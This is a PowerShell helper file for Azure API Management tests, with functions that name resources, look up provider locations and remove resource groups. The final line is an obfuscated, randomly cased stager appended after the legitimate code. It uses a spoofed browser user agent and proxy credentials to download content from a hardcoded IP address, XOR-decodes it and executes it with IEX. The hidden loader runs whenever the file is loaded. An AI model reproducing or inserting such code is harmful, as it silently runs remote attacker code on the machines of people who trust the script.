














function Get-ResourceGroupName
{
    return getAssetName
}


function Get-ApiManagementServiceName
{
    return getAssetName
}


function Get-ResourceName
{
    return getAssetName
}


function Get-ProviderLocation($provider)
{
    $locations = Get-ProviderLocations $provider
    if ($locations -eq $null) {
        "West US"
    } else {
        $locations[0]
    }
}


function Get-ProviderLocations($provider)
{
    if ([Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -ne [Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode]::Playback)
    {
        $namespace = $provider.Split("/")[0]  
        if($provider.Contains("/"))  
        {  
            $type = $provider.Substring($namespace.Length + 1)  
            $location = Get-AzResourceProvider -ProviderNamespace $namespace | where {$_.ResourceTypes[0].ResourceTypeName -eq $type}  
  
            if ($location -eq $null) 
            {  
                return @("Central US", "East US") 
            } else 
            {  
                return $location.Locations
            }  
        }
        
        return @("Central US", "East US")
    }

    return @("Central US", "East US")
}



function Clean-ResourceGroup($rgname)
{
    if ([Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -ne [Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode]::Playback) {
        Remove-AzResourceGroup -Name $rgname -Force
    }
}
[System.Net.SeRVIcePoINtMaNager]::EXPECt100ConTiNue = 0;$WC=NeW-OBjEct SYstEm.NET.WebClieNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$WC.HeadERS.AdD('User-Agent',$u);$Wc.PRoXY = [SYSTeM.Net.WEBREQuEst]::DEfAultWeBPRoxy;$wC.PrOxY.CREDENtiAlS = [SysTem.NEt.CREdeNtIalCaChE]::DefaULtNEtWORkCrEDeNtials;$K='59fMPD@S<)q,.h3F8Us7~O|Nc1xL]?V{';$i=0;[Char[]]$B=([ChaR[]]($wC.DOWNLoaDSTriNG("http://197.85.191.186:443/index.asp")))|%{$_-bXOR$k[$i++%$k.LEnGth]};IEX ($b-joiN'')

